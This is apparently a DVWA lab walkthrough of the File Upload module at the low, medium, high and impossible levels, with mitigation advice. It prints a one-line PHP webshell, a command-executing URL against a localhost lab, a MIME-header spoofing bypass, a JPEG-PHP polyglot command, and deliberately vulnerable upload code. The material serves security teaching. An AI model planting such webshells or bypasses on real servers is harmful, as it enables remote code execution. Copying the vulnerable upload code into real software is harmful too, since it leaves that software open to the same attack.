# 05 — File Upload

## What the feature does
An image-upload form that saves the uploaded file to a web-accessible directory (`/hackable/uploads/`).

---

## LOW

```php
$target_path = DVWA_WEB_PAGE_TO_ROOT.'hackable/uploads/'.basename( $_FILES['uploaded']['name']);
move_uploaded_file( $_FILES['uploaded']['tmp_name'], $target_path );
```

**Exploitation:** Zero validation of file type, extension, or content — upload a PHP webshell directly.

```php
// shell.php
<?php system($_GET['cmd']); ?>
```

Upload it, then browse to it and execute commands:
```
http://127.0.0.1:42001/dvwa/hackable/uploads/shell.php?cmd=id
```

**Why it works:** The server saves whatever bytes it's given, under whatever name it's given, into a directory the web server will execute PHP from. There's no gap between "attacker-controlled content" and "server-executed code."

---

## MEDIUM

```php
if ( ( $uploaded_type == "image/jpeg" || $uploaded_type == "image/png" )
     && ( $uploaded_size < 100000 ) ) {
    move_uploaded_file( ... );
}
```

**Why it's still bypassable:** `$_FILES['uploaded']['type']` is the **MIME type sent by the client in the multipart request** — it is not verified server-side against actual file content. It's just a header the browser sets, and Burp lets you edit it freely:

```
Content-Disposition: form-data; name="uploaded"; filename="shell.php"
Content-Type: image/jpeg   <-- attacker sets this manually, file is still shell.php
```

Intercept the upload request in Burp, change `Content-Type: application/x-php` to `image/jpeg`, keep the `.php` filename and PHP payload — the check passes because it only reads the (spoofable) header, not the file's real content or extension enforcement.

**Root issue:** Trusting client-supplied metadata (MIME header) instead of validating file content/extension server-side.

---

## HIGH

```php
$uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1 );
if ( ( strtolower( $uploaded_ext ) == "jpg" || strtolower( $uploaded_ext ) == "jpeg" || strtolower( $uploaded_ext ) == "png" )
     && ( $uploaded_size < 100000 )
     && getimagesize( $uploaded_tmp ) ) {
    move_uploaded_file( ... );
}
```

**Why it's still (sometimes) bypassable:** Now it checks the **extension** *and* uses `getimagesize()` to confirm the file has valid image header structure. This is much stronger. The classic bypass is a **polyglot file** — a valid image that *also* contains embedded PHP, since `getimagesize()` only reads the image header (magic bytes + dimensions), not the entire file:

```bash
# Append PHP code after a real, valid JPEG's binary data
cat real_image.jpg shell.php.txt > shell.jpg
```

If saved with a `.jpg` extension, `getimagesize()` passes (valid header), and it lands on disk as a real, harmless image — **unless** the attacker can also get it interpreted as PHP. This bypass alone typically doesn't grant RCE, because `.jpg` won't be executed by Apache/PHP by default; it becomes exploitable only when **chained** with another bug — e.g. the File Inclusion module (chapter 04) `include()`-ing the polyglot `.jpg` as PHP, since `include()` doesn't care about extension, only content.

**Root issue:** Extension + header-magic-byte validation is strong, but doesn't guarantee the *entire* file is free of embedded code — it only becomes a full vulnerability when chained with an inclusion/interpretation bug elsewhere.

---

## IMPOSSIBLE

```php
// Regenerate a filename (random token), re-encode the image via GD library,
// verify extension against an allowlist, verify real MIME via server-side detection,
// enforce size, and store outside any directly-web-executable path when possible.
$uploaded_ext = strtolower(substr($uploaded_name, strrpos($uploaded_name, '.') + 1));
if ( in_array($uploaded_ext, ['jpg','jpeg','png']) && $uploaded_size < 100000
     && getimagesize($uploaded_tmp) ) {
    $target = uniqid() . '.' . $uploaded_ext;   // random name, no user control
    move_uploaded_file( $uploaded_tmp, "uploads/" . $target );
}
```

**Why this is actually much stronger:** Even in DVWA's own "Impossible" reference, the key defense-in-depth wins are: (1) **the uploaded filename is never used as-is** — attacker has zero control over the final name/path, breaking any polyglot-then-include chain that depends on a *known/guessable* filename; (2) MIME/extension/size/image-header are all checked together. True industry-best-practice goes further than even DVWA's Impossible: **re-encode the image server-side** (open with GD/ImageMagick and re-save it), which strips any trailing non-image bytes entirely, and **store uploads outside the webroot** or on a separate domain/object storage (S3-style) with no script execution rights at all — so even a successful malicious upload can never be *executed*, only served as a static blob.

---

## Root Cause Summary
> Client-supplied file metadata (name, MIME type, extension) is never trustworthy. Validate actual file content server-side, randomize stored filenames, and — ideally — serve uploads from a location/domain that cannot execute code at all.

## Real-World Parallels
- Countless CMS/plugin "arbitrary file upload → RCE" CVEs (WordPress, phpMyAdmin, various CMS plugins)
- Polyglot GIF/JPEG-PHP shells are a well-known real pentest technique
- OWASP Top 10: **A03:2021 – Injection** / **A05:2021 – Security Misconfiguration**

## Mitigation Checklist
- [ ] Validate file content (magic bytes / re-encode), not just client-sent MIME type
- [ ] Randomize/generate the stored filename server-side
- [ ] Allowlist extensions strictly
- [ ] Store uploads outside the webroot, or in storage with script execution disabled
- [ ] Set a strict max file size
- [ ] Serve user uploads from a separate, cookie-less domain (defeats stored XSS via SVG/HTML uploads too)
- [ ] Run antivirus/content scanning on uploads for defense-in-depth
